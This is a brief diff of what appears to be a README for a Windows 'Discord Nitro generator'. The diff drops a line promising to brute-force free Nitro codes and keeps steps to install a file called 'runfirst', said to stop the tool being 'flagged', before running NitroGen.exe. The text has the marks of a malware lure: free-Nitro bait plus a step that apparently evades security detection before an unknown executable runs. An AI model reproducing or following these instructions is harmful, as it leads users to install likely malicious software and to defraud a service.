@@ -5,8 +5,6 @@ ATTENTION!!
 
 THIS DISCORD NITRO GENERATOR IS COMPATIBLE WITH WINDOWS ONLY.
 
-This program will help you to brute force Discord Nitro codes. GRAB NITRO FOR FREE 
-
 1. Begin by installing the file named "runfirst". (Note: This step is crucial to avoid flagging Discord Nitro Gen.)
 2. Install the program NitroGen.exe.
 3. Allow the installer to complete the process.
